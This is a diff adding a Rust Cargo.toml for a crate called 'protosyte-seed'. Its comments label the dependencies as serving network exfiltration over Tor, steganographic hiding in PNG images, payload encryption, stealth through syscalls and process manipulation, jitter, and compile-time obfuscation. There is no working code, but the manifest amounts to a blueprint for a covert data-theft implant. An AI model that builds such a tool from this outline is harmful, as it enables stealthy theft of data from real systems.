@@ -1,0 +1,44 @@
+[package]
+name = "protosyte-seed"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+# Protobuf serialization/deserialization (Primary)
+prost = { version = "0.13", features = ["derive"] }
+prost-types = "0.13"
+
+# Network exfiltration over Tor
+reqwest = { version = "0.12", features = ["rustls-tls", "socks", "multipart"] } # SOCKS5 proxy for Tor
+tokio = { version = "1.40", features = ["full"] } # Async runtime
+
+# In-memory data processing & steganography
+image = { version = "0.25", default-features = false, features = ["png"] } # LSB steganography
+aes-gcm = "0.10" # Encryption of payloads
+lz4 = "1.28" # Compression before encryption
+zeroize = "1.8" # Securely zero memory
+
+# System integration & stealth
+libc = "0.2"
+nix = "0.28" # For syscalls, process manipulation
+# For eBPF (Optional, advanced): aya = { git = "https://github.com/aya-rs/aya" }
+
+# Additional utilities
+sha2 = "0.10" # For HMAC-SHA256
+hmac = "0.12" # For HMAC computation
+hex = "0.4" # For hex encoding
+rand = "0.8" # For jitter calculation
+regex = "1.10" # For pattern matching
+
+[build-dependencies]
+prost-build = "0.13"
+
+[features]
+default = []
+obfuscate = []  # Enable compile-time obfuscation
+
+[dev-dependencies]
+tokio-test = "0.4"  # For async testing utilities
+mockito = "1.2"  # For HTTP mocking
+tempfile = "3.10"  # For temporary file testing
+
